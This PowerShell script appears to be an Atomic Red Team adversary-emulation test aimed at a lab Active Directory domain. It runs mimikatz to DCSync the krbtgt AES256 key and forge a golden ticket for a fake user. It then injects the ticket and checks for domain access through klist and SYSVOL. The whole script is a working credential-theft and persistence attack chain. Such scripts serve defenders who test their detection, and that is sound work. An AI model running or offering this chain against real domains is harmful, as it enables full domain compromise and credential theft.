cd "C:\AtomicRedTeam\ExternalPayloads\mimikatz\x64"

$domain = $env:USERDNSDOMAIN
$domainSID = (whoami /user | Select-String -Pattern "S-1-5-21-\d+-\d+-\d+").Matches.Value

Write-Host "Running DCSync to get krbtgt AES256 key..." -ForegroundColor Yellow
$output = & .\mimikatz.exe "lsadump::dcsync /domain:corp.soarlab.test /user:krbtgt" "exit" 2>&1


$aes256 = ($output -join " ") -replace '.*aes256_hmac.*?([0-9a-fA-F]{64}).*', '$1'

.\mimikatz.exe "kerberos::golden /domain:$domain /sid:$domainSID /aes256:$aes256 /user:goldenticketfakeuser /ticket:goldenticket.kirbi" "exit" | Out-Null
.\mimikatz.exe "kerberos::ptt goldenticket.kirbi" "exit" | Out-Null

Write-Host "`n=== Golden Ticket Validation ===" -ForegroundColor Cyan
klist

# Validation Logic
$ticketValid = $false

# Check if golden ticket is present in klist
$klistOutput = klist
if ($klistOutput -match "goldenticketfakeuser") {
    $ticketValid = $true
}

# Test SYSVOL access
$sysvolAccess = $false
try {
    $sysvolResult = dir "\\$domain\SYSVOL" -ErrorAction Stop
    if ($sysvolResult) { $sysvolAccess = $true }
} catch {
    $sysvolAccess = $false
}

# Final Result
Write-Host "`n=== Result ===" -ForegroundColor Cyan

if ($ticketValid) {
    Write-Host "→ Golden ticket for goldenticketfakeuser was injected successfully" -ForegroundColor Green
    
    if ($sysvolAccess) {
        Write-Host "→ SYSVOL access successful" -ForegroundColor Green
    } else {
        Write-Host "→ SYSVOL access failed" -ForegroundColor Yellow
    }
} else {
    Write-Host "→ Golden ticket was not found in klist" -ForegroundColor Red
}
